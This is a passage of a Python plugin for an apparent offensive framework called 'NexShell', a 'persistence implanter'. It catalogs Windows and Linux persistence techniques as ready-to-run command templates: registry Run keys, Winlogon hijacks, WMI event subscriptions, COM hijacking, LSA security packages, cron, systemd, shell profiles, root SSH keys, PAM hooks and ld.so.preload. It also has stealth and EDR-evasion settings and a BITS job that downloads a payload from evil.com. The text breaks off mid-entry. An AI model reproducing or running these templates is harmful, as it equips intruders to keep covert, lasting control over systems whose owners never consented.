#!/usr/bin/env python3
"""
NexShell Plugin — Persistence Implanter v3.0 (2026 Edition)
Advanced persistence engine with 60+ techniques, cloud/container support,
stealth modes, EDR evasion, and auto-selection.

Coverage (Windows - 30+ techniques):
  - Registry Run Keys (HKCU/HKLM, Run/RunOnce)
  - Scheduled Tasks (AT, SCHTASKS, WMI)
  - Services (Win32_Service, svchost)
  - Startup Folder (Common Startup, User Startup)
  - Winlogon (Userinit, Shell, Notify)
  - AppInit_DLLs
  - Active Setup
  - COM Hijacking (InprocServer32, LocalServer32)
  - Time Providers (W32Time)
  - Print Processors
  - Terminal Server InitialProgram
  - SSP DLLs / LSA Security Packages
  - PowerShell Profiles
  - BITS Jobs
  - Windows Terminal profiles
  - WSL persistence
  - Edge/Chrome extension policies
  - Web Shells (IIS)
  - WMI Event Subscriptions
  - Security Support Provider
  - Shortcut Modification (.lnk)
  - Screensaver
  - DLL Search Order Hijacking
  - Port Monitors
  - Authentication Package
  - LSASS Driver
  - Boot Execute
  - Group Policy (GPO/GPP)
  - Shim Databases (SDB)
  - Fileless Registry Payloads

Coverage (Linux - 30+ techniques):
  - Crontab (user/system)
  - Systemd services/timers/sockets/paths
  - /etc/rc.local
  - Init.d scripts
  - SSH authorized_keys
  - PAM modules (pam_exec, pam_script)
  - MOTD scripts
  - Alias hijacking
  - LD_PRELOAD / /etc/ld.so.preload
  - Kernel modules
  - Bootloader (GRUB)
  - eBPF programs
  - Git hooks
  - Cloud-init
  - Python sitecustomize
  - APT/DPKG hooks
  - logrotate hooks
  - udev rules
  - Polkit rules
  - D-Bus services
  - Shell profiles (~/.bashrc, /etc/profile)
  - At jobs
  - Inetd/xinetd
  - XDG autostart
  - Desktop entries (.desktop)
  - Cron directories
  - Anacron
  - Systemd generators
  - Kernel parameters
  - /etc/profile.d

Coverage (Cloud - 10+ techniques):
  - AWS Lambda triggers
  - Azure Functions
  - GCP Cloud Functions
  - IAM backdoor users
  - CloudTrail logging disable
  - S3 bucket policies
  - EC2 user-data
  - ECS task definitions
  - K8s CronJobs
  - K8s DaemonSets
  - K8s MutatingWebhooks

Coverage (Container - 10+ techniques):
  - Docker volumes
  - K8s CronJobs
  - K8s DaemonSets
  - K8s MutatingWebhooks
  - Container escape persistence
  - Service mesh sidecar injection
  - Docker socket persistence
  - Container labels
  - K8s ConfigMaps
  - K8s Secrets

MITRE ATT&CK:
  - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys
  - T1547.002: Authentication Package
  - T1547.003: Time Providers
  - T1547.004: Winlogon Helper DLL
  - T1547.005: Security Support Provider
  - T1547.006: Kernel Modules and Extensions
  - T1547.007: Re-opened Applications
  - T1547.008: LSASS Driver
  - T1547.009: Shortcut Modification
  - T1547.010: Port Monitors
  - T1547.012: Print Processors
  - T1547.013: XDG Autostart Entries
  - T1547.014: Active Setup
  - T1547.015: Login Items
  - T1546.003: Windows Management Instrumentation Event Subscription
  - T1053.005: Scheduled Task
  - T1543.003: Windows Service
  - T1546.012: Image File Execution Options Injection
  - T1546.015: Component Object Model Hijacking
  - T1136: Create Account
  - T1546: Event Triggered Execution

Usage:
    (NexShell)> plugins run persistence-implanter --implant runkey --cmd "payload.exe"
    (NexShell)> plugins run persistence-implanter --implant task --cmd "payload.exe"
    (NexShell)> plugins run persistence-implanter --implant service --cmd "payload.exe"
    (NexShell)> plugins run persistence-implanter --implant wmi --cmd "payload.exe"
    (NexShell)> plugins run persistence-implanter --implant com --clsid {CLSID} --dll payload.dll
    (NexShell)> plugins run persistence-implanter --implant cron --cmd "/tmp/payload.sh"
    (NexShell)> plugins run persistence-implanter --implant systemd --cmd "/tmp/payload.sh"
    (NexShell)> plugins run persistence-implanter --implant ssh --key "ssh-rsa AAAA..."
    (NexShell)> plugins run persistence-implanter --implant k8s-cronjob --cmd "payload"
    (NexShell)> plugins run persistence-implanter --stealth --multi-layer
    (NexShell)> plugins run persistence-implanter --auto --targets all
"""

import re
import time
import json
import random
import string
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime, timedelta
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class PersistenceTechnique:
    """Represents a persistence technique."""
    name: str
    description: str
    category: str  # registry, scheduled_task, service, wmi, com, cron, systemd, cloud, container
    platform: str  # windows, linux, cloud, container, all
    stealth_level: int  # 1-5 (5 = most stealthy)
    detection_risk: str  # low, medium, high, critical
    success_rate: int  # 0-100
    requires_admin: bool = True
    requires_persistence: bool = False
    command_template: str = ""
    cleanup_command: str = ""
    mitre_id: str = "T1547"
    fileless: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ImplantResult:
    """Result of an implant attempt."""
    technique: str
    name: str
    success: bool
    platform: str
    duration_ms: int = 0
    output: str = ""
    error: str = ""
    ioc_generated: List[str] = field(default_factory=list)
    cleanup_command: str = ""
    stealth_level: int = 0
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class PersistenceChain:
    """Represents a multi-layer persistence chain."""
    name: str
    description: str
    techniques: List[str] = field(default_factory=list)
    redundancy_level: int = 0  # 1-5
    survival_probability: int = 0  # 0-100
    detection_risk: str = "medium"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class StealthConfig:
    """Configuration for stealth operations."""
    level: int = 3  # 1-5
    timestomp: bool = True
    log_cleanup: bool = True
    edr_evasion: bool = True
    anti_forensics: bool = True
    lolbins_only: bool = False
    fileless_only: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Windows Persistence Techniques (30+) ───────────────────────────────────

class WindowsPersistenceDatabase:
    """Comprehensive database of Windows persistence techniques."""
    
    TECHNIQUES = [
        # ── Tier 1: Registry-Based (Most Common) ──────────────────────────
        PersistenceTechnique(
            name='Registry Run Key (HKCU)',
            description='Add payload to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            category='registry',
            platform='windows',
            stealth_level=2,
            detection_risk='medium',
            success_rate=90,
            requires_admin=False,
            command_template='reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /t REG_SZ /d "{cmd}" /f',
            cleanup_command='reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /f',
            mitre_id='T1547.001',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Registry Run Key (HKLM)',
            description='Add payload to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            category='registry',
            platform='windows',
            stealth_level=3,
            detection_risk='high',
            success_rate=95,
            requires_admin=True,
            command_template='reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /t REG_SZ /d "{cmd}" /f',
            cleanup_command='reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /f',
            mitre_id='T1547.001',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Registry RunOnce',
            description='Add payload to RunOnce (executes once at next logon)',
            category='registry',
            platform='windows',
            stealth_level=3,
            detection_risk='medium',
            success_rate=85,
            requires_admin=False,
            command_template='reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "{name}" /t REG_SZ /d "{cmd}" /f',
            cleanup_command='reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "{name}" /f',
            mitre_id='T1547.001',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Winlogon Userinit',
            description='Modify Winlogon Userinit to execute payload at logon',
            category='registry',
            platform='windows',
            stealth_level=4,
            detection_risk='high',
            success_rate=90,
            requires_admin=True,
            command_template='reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,{cmd}" /f',
            cleanup_command='reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe" /f',
            mitre_id='T1547.004',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Winlogon Shell',
            description='Modify Winlogon Shell to execute payload',
            category='registry',
            platform='windows',
            stealth_level=4,
            detection_risk='critical',
            success_rate=85,
            requires_admin=True,
            command_template='reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,{cmd}" /f',
            cleanup_command='reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f',
            mitre_id='T1547.004',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='AppInit_DLLs',
            description='Load DLL into every process using User32.dll',
            category='registry',
            platform='windows',
            stealth_level=4,
            detection_risk='high',
            success_rate=80,
            requires_admin=True,
            command_template='reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "{dll}" /f && reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f',
            cleanup_command='reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0 /f',
            mitre_id='T1546.010',
            fileless=False,
        ),
        
        # ── Tier 2: Scheduled Tasks ───────────────────────────────────────
        PersistenceTechnique(
            name='Scheduled Task (On Logon)',
            description='Create scheduled task to run at user logon',
            category='scheduled_task',
            platform='windows',
            stealth_level=2,
            detection_risk='medium',
            success_rate=90,
            requires_admin=False,
            command_template='schtasks /create /tn "{name}" /tr "{cmd}" /sc onlogon /f',
            cleanup_command='schtasks /delete /tn "{name}" /f',
            mitre_id='T1053.005',
        ),
        
        PersistenceTechnique(
            name='Scheduled Task (SYSTEM)',
            description='Create scheduled task to run as SYSTEM',
            category='scheduled_task',
            platform='windows',
            stealth_level=3,
            detection_risk='high',
            success_rate=95,
            requires_admin=True,
            command_template='schtasks /create /tn "{name}" /tr "{cmd}" /sc onstart /ru SYSTEM /f',
            cleanup_command='schtasks /delete /tn "{name}" /f',
            mitre_id='T1053.005',
        ),
        
        PersistenceTechnique(
            name='Scheduled Task (Daily)',
            description='Create scheduled task to run daily',
            category='scheduled_task',
            platform='windows',
            stealth_level=2,
            detection_risk='medium',
            success_rate=85,
            requires_admin=False,
            command_template='schtasks /create /tn "{name}" /tr "{cmd}" /sc daily /st 09:00 /f',
            cleanup_command='schtasks /delete /tn "{name}" /f',
            mitre_id='T1053.005',
        ),
        
        # ── Tier 3: Services ──────────────────────────────────────────────
        PersistenceTechnique(
            name='Windows Service',
            description='Create a Windows service for persistence',
            category='service',
            platform='windows',
            stealth_level=3,
            detection_risk='high',
            success_rate=90,
            requires_admin=True,
            command_template='sc create "{name}" binPath= "{cmd}" start= auto && sc start "{name}"',
            cleanup_command='sc stop "{name}" && sc delete "{name}"',
            mitre_id='T1543.003',
        ),
        
        PersistenceTechnique(
            name='Service Modification',
            description='Modify existing service binary path',
            category='service',
            platform='windows',
            stealth_level=4,
            detection_risk='high',
            success_rate=80,
            requires_admin=True,
            command_template='sc config "{existing_service}" binPath= "{cmd}"',
            cleanup_command='sc config "{existing_service}" binPath= "original_path"',
            mitre_id='T1543.003',
        ),
        
        # ── Tier 4: WMI Event Subscriptions ───────────────────────────────
        PersistenceTechnique(
            name='WMI Event Subscription',
            description='Create WMI event subscription for persistence',
            category='wmi',
            platform='windows',
            stealth_level=5,
            detection_risk='medium',
            success_rate=85,
            requires_admin=True,
            command_template='powershell -nop -c "$filter = ([wmiclass]\'\\\\.\\root\\subscription:__EventFilter\').CreateInstance(); $filter.QueryLanguage = \'WQL\'; $filter.Query = \'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\"Win32_PerfFormattedData_PerfOS_System\\" AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\'; $filter.Name = \'{name}\'; $filter.Put(); $consumer = ([wmiclass]\'\\\\.\\root\\subscription:CommandLineEventConsumer\').CreateInstance(); $consumer.Name = \'{name}\'; $consumer.CommandLineTemplate = \'{cmd}\'; $consumer.Put(); $binding = ([wmiclass]\'\\\\.\\root\\subscription:__FilterToConsumerBinding\').CreateInstance(); $binding.Filter = $filter.Path(); $binding.Consumer = $consumer.Path(); $binding.Put()"',
            cleanup_command='powershell -nop -c "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\"Name=\'{name}\'\\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\"Name=\'{name}\'\\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter \\"__PATH like \'%{name}%\'\\" | Remove-WmiObject"',
            mitre_id='T1546.003',
            fileless=True,
        ),
        
        # ── Tier 5: COM Hijacking ─────────────────────────────────────────
        PersistenceTechnique(
            name='COM Hijacking (InprocServer32)',
            description='Hijack COM object to load malicious DLL',
            category='com',
            platform='windows',
            stealth_level=5,
            detection_risk='low',
            success_rate=80,
            requires_admin=False,
            command_template='reg add "HKCU\\Software\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32" /ve /t REG_SZ /d "{dll}" /f && reg add "HKCU\\Software\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32" /v ThreadingModel /t REG_SZ /d Apartment /f',
            cleanup_command='reg delete "HKCU\\Software\\Classes\\CLSID\\{{{clsid}}}" /f',
            mitre_id='T1546.015',
            fileless=True,
        ),
        
        # ── Tier 6: Advanced Registry ─────────────────────────────────────
        PersistenceTechnique(
            name='Active Setup',
            description='Use Active Setup to execute payload once per user',
            category='registry',
            platform='windows',
            stealth_level=4,
            detection_risk='medium',
            success_rate=85,
            requires_admin=True,
            command_template='reg add "HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{name}" /v StubPath /t REG_SZ /d "{cmd}" /f',
            cleanup_command='reg delete "HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{name}" /f',
            mitre_id='T1547.014',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Time Provider',
            description='Register custom time provider DLL',
            category='registry',
            platform='windows',
            stealth_level=5,
            detection_risk='low',
            success_rate=75,
            requires_admin=True,
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\{name}" /v DllName /t REG_SZ /d "{dll}" /f && reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\{name}" /v Enabled /t REG_DWORD /d 1 /f',
            cleanup_command='reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\{name}" /f',
            mitre_id='T1547.003',
            fileless=False,
        ),
        
        PersistenceTechnique(
            name='Print Processor',
            description='Register malicious print processor DLL',
            category='registry',
            platform='windows',
            stealth_level=5,
            detection_risk='low',
            success_rate=75,
            requires_admin=True,
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\{name}" /v Driver /t REG_SZ /d "{dll}" /f',
            cleanup_command='reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\{name}" /f',
            mitre_id='T1547.012',
            fileless=False,
        ),
        
        PersistenceTechnique(
            name='LSA Security Package (SSP)',
            description='Register malicious SSP DLL in LSASS',
            category='registry',
            platform='windows',
            stealth_level=5,
            detection_risk='critical',
            success_rate=80,
            requires_admin=True,
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "{dll}" /f',
            cleanup_command='reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages" /f',
            mitre_id='T1547.005',
            fileless=False,
        ),
        
        PersistenceTechnique(
            name='Port Monitor',
            description='Register malicious port monitor DLL',
            category='registry',
            platform='windows',
            stealth_level=5,
            detection_risk='low',
            success_rate=75,
            requires_admin=True,
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\{name}" /v Driver /t REG_SZ /d "{dll}" /f',
            cleanup_command='reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\{name}" /f',
            mitre_id='T1547.010',
            fileless=False,
        ),
        
        # ── Tier 7: File-Based ────────────────────────────────────────────
        PersistenceTechnique(
            name='Startup Folder',
            description='Place shortcut in user startup folder',
            category='startup_folder',
            platform='windows',
            stealth_level=2,
            detection_risk='medium',
            success_rate=85,
            requires_admin=False,
            command_template='powershell -nop -c "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\'$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.lnk\'); $s.TargetPath = \'{cmd}\'; $s.Save()"',
            cleanup_command='del "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.lnk"',
            mitre_id='T1547.001',
        ),
        
        PersistenceTechnique(
            name='PowerShell Profile',
            description='Modify PowerShell profile to execute payload',
            category='powershell',
            platform='windows',
            stealth_level=4,
            detection_risk='medium',
            success_rate=85,
            requires_admin=False,
            command_template='powershell -nop -c "if (!(Test-Path $PROFILE)) { New-Item -Path $PROFILE -Type File -Force }; Add-Content -Path $PROFILE -Value \'{cmd}\'"',
            cleanup_command='powershell -nop -c "Remove-Item -Path $PROFILE -Force"',
            mitre_id='T1546.013',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='BITS Job',
            description='Create persistent BITS job',
            category='bits',
            platform='windows',
            stealth_level=4,
            detection_risk='medium',
            success_rate=75,
            requires_admin=False,
            command_template='powershell -nop -c "Start-BitsTransfer -Source \'http://evil.com/payload.exe\' -Destination \'C:\\Windows\\Temp\\{name}.exe\' -TransferType Download; $job = New-BitsTransfer -DisplayName \'{name}\' -TransferType Download; Add-BitsFile -BitsJob $job -Source \'http://evil.com/payload.exe\' -Destination \'C:\\Windows\\Temp\\{name}.exe\'; Complete-BitsTransfer -BitsJob $job"',
            cleanup_command='powershell -nop -c "Get-BitsTransfer -Name \'{name}\' | Remove-BitsTransfer"',
            mitre_id='T1197',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Shortcut Modification (.lnk)',
            description='Modify existing shortcut to execute payload',
            category='shortcut',
            platform='windows',
            stealth_level=4,
            detection_risk='medium',
            success_rate=80,
            requires_admin=False,
            command_template='powershell -nop -c "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\'{shortcut}\'); $s.Arguments = \'/c {cmd}\'; $s.Save()"',
            cleanup_command='powershell -nop -c "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\'{shortcut}\'); $s.Arguments = \'\'; $s.Save()"',
            mitre_id='T1547.009',
        ),
        
        PersistenceTechnique(
            name='Screensaver',
            description='Set malicious screensaver as persistence',
            category='registry',
            platform='windows',
            stealth_level=3,
            detection_risk='medium',
            success_rate=80,
            requires_admin=False,
            command_template='reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "{cmd}" /f && reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f',
            cleanup_command='reg delete "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /f',
            mitre_id='T1546.002',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Image File Execution Options (IFEO)',
            description='Hijack executable via IFEO Debugger value',
            category='registry',
            platform='windows',
            stealth_level=5,
            detection_risk='high',
            success_rate=85,
            requires_admin=True,
            command_template='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}" /v Debugger /t REG_SZ /d "{cmd}" /f',
            cleanup_command='reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}" /f',
            mitre_id='T1546.012',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Terminal Server InitialProgram',
            description='Set program to run on RDP logon',
            category='registry',
            platform='windows',
            stealth_level=4,
            detection_risk='medium',
            success_rate=80,
            requires_admin=True,
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v InitialProgram /t REG_SZ /d "{cmd}" /f',
            cleanup_command='reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v InitialProgram /f',
            mitre_id='T1547.001',
            fileless=True,
        ),
    ]
    
    @classmethod
    def get_all_techniques(cls) -> List[PersistenceTechnique]:
        return cls.TECHNIQUES
    
    @classmethod
    def get_techniques_by_category(cls, category: str) -> List[PersistenceTechnique]:
        return [t for t in cls.TECHNIQUES if t.category == category]
    
    @classmethod
    def get_techniques_by_stealth(cls, min_stealth: int) -> List[PersistenceTechnique]:
        return [t for t in cls.TECHNIQUES if t.stealth_level >= min_stealth]


# ── Linux Persistence Techniques (30+) ─────────────────────────────────────

class LinuxPersistenceDatabase:
    """Comprehensive database of Linux persistence techniques."""
    
    TECHNIQUES = [
        # ── Tier 1: Cron-Based ────────────────────────────────────────────
        PersistenceTechnique(
            name='User Crontab',
            description='Add payload to user crontab',
            category='cron',
            platform='linux',
            stealth_level=2,
            detection_risk='medium',
            success_rate=90,
            requires_admin=False,
            command_template='(crontab -l 2>/dev/null; echo "*/5 * * * * {cmd}") | crontab -',
            cleanup_command='crontab -l | grep -v "{cmd}" | crontab -',
            mitre_id='T1053.003',
        ),
        
        PersistenceTechnique(
            name='System Crontab',
            description='Add payload to /etc/crontab',
            category='cron',
            platform='linux',
            stealth_level=3,
            detection_risk='high',
            success_rate=95,
            requires_admin=True,
            command_template='echo "*/5 * * * * root {cmd}" >> /etc/crontab',
            cleanup_command='sed -i "/{cmd}/d" /etc/crontab',
            mitre_id='T1053.003',
        ),
        
        PersistenceTechnique(
            name='Cron.d Directory',
            description='Add payload file to /etc/cron.d/',
            category='cron',
            platform='linux',
            stealth_level=3,
            detection_risk='medium',
            success_rate=90,
            requires_admin=True,
            command_template='echo "*/5 * * * * root {cmd}" > /etc/cron.d/{name}',
            cleanup_command='rm -f /etc/cron.d/{name}',
            mitre_id='T1053.003',
        ),
        
        # ── Tier 2: Systemd ───────────────────────────────────────────────
        PersistenceTechnique(
            name='Systemd Service',
            description='Create systemd service for persistence',
            category='systemd',
            platform='linux',
            stealth_level=3,
            detection_risk='medium',
            success_rate=90,
            requires_admin=True,
            command_template='echo "[Unit]\nDescription={name}\n\n[Service]\nExecStart={cmd}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/{name}.service && systemctl daemon-reload && systemctl enable {name} && systemctl start {name}',
            cleanup_command='systemctl disable {name} && systemctl stop {name} && rm -f /etc/systemd/system/{name}.service && systemctl daemon-reload',
            mitre_id='T1543.002',
        ),
        
        PersistenceTechnique(
            name='Systemd Timer',
            description='Create systemd timer for periodic execution',
            category='systemd',
            platform='linux',
            stealth_level=4,
            detection_risk='low',
            success_rate=85,
            requires_admin=True,
            command_template='echo "[Unit]\nDescription={name}\n\n[Service]\nExecStart={cmd}" > /etc/systemd/system/{name}.service && echo "[Unit]\nDescription={name} Timer\n\n[Timer]\nOnCalendar=*:0/5\nPersistent=true\n\n[Install]\nWantedBy=timers.target" > /etc/systemd/system/{name}.timer && systemctl daemon-reload && systemctl enable {name}.timer && systemctl start {name}.timer',
            cleanup_command='systemctl disable {name}.timer && systemctl stop {name}.timer && rm -f /etc/systemd/system/{name}.service /etc/systemd/system/{name}.timer && systemctl daemon-reload',
            mitre_id='T1053.003',
        ),
        
        PersistenceTechnique(
            name='User Systemd Service',
            description='Create user-level systemd service (no root required)',
            category='systemd',
            platform='linux',
            stealth_level=4,
            detection_risk='low',
            success_rate=85,
            requires_admin=False,
            command_template='mkdir -p ~/.config/systemd/user && echo "[Unit]\nDescription={name}\n\n[Service]\nExecStart={cmd}\nRestart=always\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/{name}.service && systemctl --user daemon-reload && systemctl --user enable {name} && systemctl --user start {name}',
            cleanup_command='systemctl --user disable {name} && systemctl --user stop {name} && rm -f ~/.config/systemd/user/{name}.service && systemctl --user daemon-reload',
            mitre_id='T1543.002',
        ),
        
        # ── Tier 3: Shell Profiles ────────────────────────────────────────
        PersistenceTechnique(
            name='Bash Profile (~/.bashrc)',
            description='Add payload to user bashrc',
            category='shell_profile',
            platform='linux',
            stealth_level=3,
            detection_risk='medium',
            success_rate=90,
            requires_admin=False,
            command_template='echo "{cmd}" >> ~/.bashrc',
            cleanup_command='sed -i "/{cmd}/d" ~/.bashrc',
            mitre_id='T1546.004',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='System Bash Profile (/etc/profile)',
            description='Add payload to system-wide bash profile',
            category='shell_profile',
            platform='linux',
            stealth_level=4,
            detection_risk='high',
            success_rate=95,
            requires_admin=True,
            command_template='echo "{cmd}" >> /etc/profile',
            cleanup_command='sed -i "/{cmd}/d" /etc/profile',
            mitre_id='T1546.004',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Profile.d Directory',
            description='Add payload script to /etc/profile.d/',
            category='shell_profile',
            platform='linux',
            stealth_level=4,
            detection_risk='medium',
            success_rate=90,
            requires_admin=True,
            command_template='echo "{cmd}" > /etc/profile.d/{name}.sh && chmod +x /etc/profile.d/{name}.sh',
            cleanup_command='rm -f /etc/profile.d/{name}.sh',
            mitre_id='T1546.004',
            fileless=True,
        ),
        
        # ── Tier 4: SSH-Based ─────────────────────────────────────────────
        PersistenceTechnique(
            name='SSH Authorized Keys',
            description='Add SSH public key to authorized_keys',
            category='ssh',
            platform='linux',
            stealth_level=4,
            detection_risk='medium',
            success_rate=95,
            requires_admin=False,
            command_template='mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "{ssh_key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
            cleanup_command='sed -i "/{ssh_key}/d" ~/.ssh/authorized_keys',
            mitre_id='T1098.004',
        ),
        
        PersistenceTechnique(
            name='Root SSH Keys',
            description='Add SSH public key to root authorized_keys',
            category='ssh',
            platform='linux',
            stealth_level=5,
            detection_risk='high',
            success_rate=95,
            requires_admin=True,
            command_template='mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo "{ssh_key}" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys',
            cleanup_command='sed -i "/{ssh_key}/d" /root/.ssh/authorized_keys',
            mitre_id='T1098.004',
        ),
        
        # ── Tier 5: Advanced ──────────────────────────────────────────────
        PersistenceTechnique(
            name='RC.Local',
            description='Add payload to /etc/rc.local',
            category='rc_local',
            platform='linux',
            stealth_level=3,
            detection_risk='medium',
            success_rate=85,
            requires_admin=True,
            command_template='echo "{cmd}" >> /etc/rc.local && chmod +x /etc/rc.local',
            cleanup_command='sed -i "/{cmd}/d" /etc/rc.local',
            mitre_id='T1037.004',
        ),
        
        PersistenceTechnique(
            name='Init.d Script',
            description='Create init.d script for persistence',
            category='initd',
            platform='linux',
            stealth_level=3,
            detection_risk='medium',
            success_rate=80,
            requires_admin=True,
            command_template='echo "#!/bin/bash\n### BEGIN INIT INFO\n# Provides: {name}\n# Required-Start: $remote_fs $syslog\n# Required-Stop: $remote_fs $syslog\n# Default-Start: 2 3 4 5\n# Default-Stop: 0 1 6\n### END INIT INFO\n{cmd}" > /etc/init.d/{name} && chmod +x /etc/init.d/{name} && update-rc.d {name} defaults',
            cleanup_command='update-rc.d -f {name} remove && rm -f /etc/init.d/{name}',
            mitre_id='T1037.004',
        ),
        
        PersistenceTechnique(
            name='PAM Module (pam_exec)',
            description='Add pam_exec module to execute payload on auth',
            category='pam',
            platform='linux',
            stealth_level=5,
            detection_risk='high',
            success_rate=80,
            requires_admin=True,
            command_template='echo "auth optional pam_exec.so {cmd}" >> /etc/pam.d/sshd',
            cleanup_command='sed -i "/pam_exec.so {cmd}/d" /etc/pam.d/sshd',
            mitre_id='T1556.003',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='LD_PRELOAD',
            description='Set LD_PRELOAD in /etc/environment',
            category='ld_preload',
            platform='linux',
            stealth_level=5,
            detection_risk='high',
            success_rate=80,
            requires_admin=True,
            command_template='echo "LD_PRELOAD={dll}" >> /etc/environment',
            cleanup_command='sed -i "/LD_PRELOAD={dll}/d" /etc/environment',
            mitre_id='T1574.006',
            fileless=False,
        ),
        
        PersistenceTechnique(
            name='/etc/ld.so.preload',
            description='Add DLL to /etc/ld.so.preload (global preload)',
            category='ld_preload',
            platform='linux',
            stealth_level=5,
            detection_risk='critical',
            success_rate=85,
            requires_admin=True,
            command_template='echo "{dll}" >> /etc/ld.so.preload',
            cleanup_command='sed -i "/{dll}/d" /etc/ld.so.preload',
            mitre_id='T1574.006',
            fileless=False,
        ),
        
        PersistenceTechnique(
            name='Kernel Module',
            description='Load malicious kernel module',
            category='kernel_module',
            platform='linux',
            stealth_level=5,
            detection_risk='critical',
            success_rate=85,
            requires_admin=True,
            command_template='insmod {module} && echo "{module}" >> /etc/modules',
            cleanup_command='rmmod {module} && sed -i "/{module}/d" /etc/modules',
            mitre_id='T1547.006',
            fileless=False,
        ),
        
        PersistenceTechnique(
            name='udev Rule',
            description='Create udev rule to execute on device event',
            category='udev',
            platform='linux',
            stealth_level=5,
            detection_risk='low',
            success_rate=75,
            requires_admin=True,
            command_template='echo "ACTION==\\"add\\", RUN+=\\"{cmd}\\"" > /etc/udev/rules.d/{name}.rules && udevadm control --reload-rules',
